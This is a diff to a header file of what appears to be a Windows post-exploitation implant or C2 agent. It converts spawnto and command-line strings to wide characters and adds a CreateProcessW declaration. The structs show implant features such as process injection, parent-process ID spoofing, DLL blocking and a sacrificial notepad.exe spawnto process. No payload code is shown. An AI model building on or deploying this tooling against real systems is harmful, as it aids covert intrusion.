@@ -153,7 +153,7 @@ EXTERN_C UPTR EndPtr();
 #endif
 
 #ifndef KH_SPAWNTO_X64
-#define KH_SPAWNTO_X64 "C:\\Windows\\System32\\notepad.exe"
+#define KH_SPAWNTO_X64 L"C:\\Windows\\System32\\notepad.exe"
 #endif // KH_SPAWNTO_X64
 
 #ifndef KH_FORK_PIPE_NAME
@@ -326,8 +326,8 @@ typedef struct {
     } Injection;
 
     struct {
-        CHAR* Spawnto;
-        CHAR* ForkPipe;
+        WCHAR* Spawnto;
+        CHAR*  ForkPipe;
     } Postex;
 
     struct {
@@ -451,15 +451,15 @@ namespace Root {
             } Mask;
 
             struct {
-                ULONG ParentID;
-                BOOL  BlockDlls;
-                CHAR* CurrentDir;
-                BOOL  Pipe;
+                ULONG  ParentID;
+                BOOL   BlockDlls;
+                WCHAR* CurrentDir;
+                BOOL   Pipe;
             } Ps;
 
             struct {
-                CHAR* Spawnto;
-                CHAR* ForkPipe;
+                WCHAR* Spawnto;
+                CHAR*  ForkPipe;
             } Postex;
 
             struct {
@@ -708,6 +708,7 @@ namespace Root {
             DECLAPI( SetFileInformationByHandle );
         
             DECLAPI( CreateProcessA );
+            DECLAPI( CreateProcessW );
             DECLAPI( GetExitCodeProcess );
             DECLAPI( OpenProcess );
             DECLAPI( IsWow64Process );
@@ -831,6 +832,7 @@ namespace Root {
             RSL_TYPE( SetFileInformationByHandle ),
         
             RSL_TYPE( CreateProcessA ),
+            RSL_TYPE( CreateProcessW ),
             RSL_TYPE( OpenProcess ),
             RSL_TYPE( IsWow64Process ),
         
@@ -1806,7 +1808,8 @@ public:
     CHAR DownloadUUID[37] = "00000000-0000-0000-0000-000000000002";
 
     CHAR* CurrentUUID  = nullptr;
-    INT32 CurrentCmdId = 0;
+    ULONG CurrentCmdId = 0;
+    ULONG CurrentSubId = 0;
 
     auto Create(
         _In_ CHAR*   UUID, 
@@ -2414,7 +2417,7 @@ public:
     ) -> HANDLE;
 
     auto Create(
-        _In_  PCHAR                CommandLine,
+        _In_  WCHAR*               CommandLine,
         _In_  ULONG                InheritHandles,
         _In_  ULONG                PsFlags,
         _Out_ PPROCESS_INFORMATION PsInfo
